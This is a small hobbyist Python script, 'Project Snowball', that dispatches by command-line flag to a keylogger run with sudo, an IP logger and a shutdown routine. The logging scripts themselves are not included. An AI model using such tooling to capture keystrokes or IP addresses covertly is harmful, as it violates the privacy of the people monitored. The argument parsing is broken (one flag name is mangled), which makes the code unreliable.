import os
import sys
import argparse as args
import urllib
import art as a

dotask = False

parser = args.ArgumentParser()
parser.add_argument('-os', help='Speciify OS', required=True)
parser.add_argument("-shutdown", help="Shutdown System | Set to 'True'")
parser.add_argument("-log", "-logger", help="Start Key Logger | Set to 'True'")
parser.add_argument("-iplog" "-iplogger", help="Start IP Logger | Set to 'True'")
defs = parser.parse_args()
a.tprint('Project Snowball')

checktrue = True
osarg = defs.os
shutarg = defs.shutdown
logarg = defs.log
iplarg = defs.iplog

def shutdown():
    if osarg == 'windows':
        os.system('python winshutdown.py')
    if osarg == 'linux':
        os.system('python linuxshutdown.py')
    if osarg == 'mac':
        print('Mac_OS is not supported by Snowball shutdown feature')

def keylogger():
    print('Starting Logger')
    os.system('sudo python keylgr.py')

def iplog():
    os.system('python iplog.py')


while True:
    if logarg == "True":
        keylogger()
        break
    if shutarg == "True":
        shutdown()
        break
    if iplarg == "True":
        iplog()
        break